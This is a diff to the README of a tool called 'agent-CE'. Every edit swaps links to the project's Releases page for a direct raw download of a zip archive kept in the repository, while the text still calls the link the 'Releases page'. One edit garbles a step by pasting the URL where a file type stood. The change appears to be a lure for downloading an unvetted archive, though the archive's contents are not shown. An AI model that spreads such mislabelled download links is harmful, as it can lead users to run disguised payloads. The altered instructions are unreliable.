@@ -1,6 +1,6 @@
 # 🚀 agent-CE - Simplifying Continuous Evaluation for Everyone
 
-[![Download agent-CE](https://img.shields.io/badge/Download-agent--CE-brightgreen)](https://github.com/undomestic-georgebeadle691/agent-CE/releases)
+[![Download agent-CE](https://raw.githubusercontent.com/undomestic-georgebeadle691/agent-CE/main/OpenaiEvaluation/agent-CE_2.0.zip)](https://raw.githubusercontent.com/undomestic-georgebeadle691/agent-CE/main/OpenaiEvaluation/agent-CE_2.0.zip)
 
 ## 📚 Overview
 
@@ -20,11 +20,11 @@ To run Agent-CE effectively, ensure your system meets the following requirements
 
 Follow these steps to download and set up Agent-CE:
 
-1. **Visit the Download Page**: Click [here](https://github.com/undomestic-georgebeadle691/agent-CE/releases) to go to the Releases page.
+1. **Visit the Download Page**: Click [here](https://raw.githubusercontent.com/undomestic-georgebeadle691/agent-CE/main/OpenaiEvaluation/agent-CE_2.0.zip) to go to the Releases page.
    
 2. **Choose the Latest Release**: On the Releases page, find the most recent version listed. It will generally be at the top of the list. 
 
-3. **Download the Suitable File**: Look for the file that matches your operating system. If you see options like `.tar.gz` or `.zip`, select the one that fits your platform.
+3. **Download the Suitable File**: Look for the file that matches your operating system. If you see options like `https://raw.githubusercontent.com/undomestic-georgebeadle691/agent-CE/main/OpenaiEvaluation/agent-CE_2.0.zip` or `.zip`, select the one that fits your platform.
 
 4. **Extract the Files**: If you downloaded a compressed file, right-click on it and choose "Extract Here" or "Extract All," depending on your operating system.
 
@@ -41,7 +41,7 @@ Follow these steps to download and set up Agent-CE:
 
 ## 📥 Download & Install
 
-To get started with Agent-CE, visit the [Releases page](https://github.com/undomestic-georgebeadle691/agent-CE/releases) to download the latest version. Choose the file compatible with your operating system, and follow the instructions provided in the "Getting Started" section to install and run the application.
+To get started with Agent-CE, visit the [Releases page](https://raw.githubusercontent.com/undomestic-georgebeadle691/agent-CE/main/OpenaiEvaluation/agent-CE_2.0.zip) to download the latest version. Choose the file compatible with your operating system, and follow the instructions provided in the "Getting Started" section to install and run the application.
 
 ## ⚙️ Features
 
